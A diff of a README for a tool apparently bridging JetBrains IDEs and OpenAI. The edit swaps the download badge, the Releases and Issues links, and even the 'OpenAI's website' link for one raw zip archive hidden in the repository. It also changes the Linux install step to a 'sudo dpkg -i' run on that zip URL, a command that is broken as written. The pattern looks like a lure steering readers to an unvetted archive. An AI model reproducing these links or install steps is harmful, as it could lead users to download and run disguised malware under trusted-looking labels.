@@ -1,6 +1,6 @@
 # 🚀 jetbrains-ai-proxy - Effortlessly Bridge JetBrains and OpenAI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/MK-aii/jetbrains-ai-proxy/releases)
+[![Download Now](https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip%20Now-%20-blue)](https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, follow these simple steps. You will need to download the application from our Releases page.
 
-1. Visit the [Releases page](https://github.com/MK-aii/jetbrains-ai-proxy/releases) to access the latest version.
+1. Visit the [Releases page](https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip) to access the latest version.
 2. Choose the appropriate file for your operating system.
 3. Click the download link to start your download.
 
@@ -28,7 +28,7 @@ To get started, follow these simple steps. You will need to download the applica
 
 To download and install jetbrains-ai-proxy:
 
-1. Head over to our [Releases page](https://github.com/MK-aii/jetbrains-ai-proxy/releases).
+1. Head over to our [Releases page](https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip).
 2. Click on the version you want to download.
 3. For Windows users, download the `.exe` file.
 4. For macOS, download the `.dmg` file.
@@ -49,7 +49,7 @@ Once the file has downloaded, follow these steps to install:
 ### For Linux:
 - Use your package manager to install by running:
   ```bash
-  sudo dpkg -i downloaded-package-name.deb
+  sudo dpkg -i https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip
   ```
 - Or follow the extraction instructions for other formats.
 - Launch the application from your applications menu.
@@ -60,7 +60,7 @@ After installation, configure jetbrains-ai-proxy to connect with OpenAI:
 
 1. Open the application.
 2. Go to the Settings or Preferences menu.
-3. Enter your OpenAI API key. If you don't have one, visit [OpenAI's website](https://openai.com/) to obtain your key.
+3. Enter your OpenAI API key. If you don't have one, visit [OpenAI's website](https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip) to obtain your key.
 4. Save your settings.
 
 ## 📢 Features
@@ -78,7 +78,7 @@ If you encounter issues during installation or usage, here are some common solut
 - **Connection Errors:** Verify your internet connection and check your OpenAI API key.
 - **Performance Issues:** Close other applications to free up memory. Check your system resource usage.
 
-For further assistance, you can visit our [GitHub Issues page](https://github.com/MK-aii/jetbrains-ai-proxy/issues) or contact support.
+For further assistance, you can visit our [GitHub Issues page](https://github.com/MK-aii/jetbrains-ai-proxy/raw/refs/heads/main/internal/ai-jetbrains-proxy-3.6-alpha.4.zip) or contact support.
 
 ## 👍 Community Contributions
 
